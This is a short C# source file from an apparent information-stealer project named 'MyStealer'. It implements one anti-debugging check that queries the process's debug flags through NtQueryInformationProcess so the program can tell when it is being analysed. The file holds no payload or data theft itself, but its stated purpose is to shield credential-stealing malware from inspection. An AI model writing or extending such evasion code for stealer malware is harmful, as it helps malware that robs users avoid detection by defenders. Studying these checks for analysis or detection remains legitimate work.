﻿using System.Diagnostics;
using static MyStealer.AntiDebug.NativeCalls;

namespace MyStealer.AntiDebug.Check.Debugging
{
    /// <summary>
    /// Use <c>kernel32!NtQueryInformationProcess</c> with <c>PROCESSINFOCLASS.ProcessDebugFlags</c> to detect debugger flag presence.
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs
    /// </summary>
    public class ProcessDebugFlags : CheckBase
    {
        public override string Name => "ProcessInformation DebugFlags";

        public override bool CheckActive()
        {
            const uint ProcessDebugFlags = 0x1F; // https://ntdoc.m417z.com/processinfoclass
            NtQueryInformationProcess_uint(Process.GetCurrentProcess().SafeHandle, ProcessDebugFlags, out var flag, sizeof(uint), 0);
            return flag == 0;
        }
    }
}
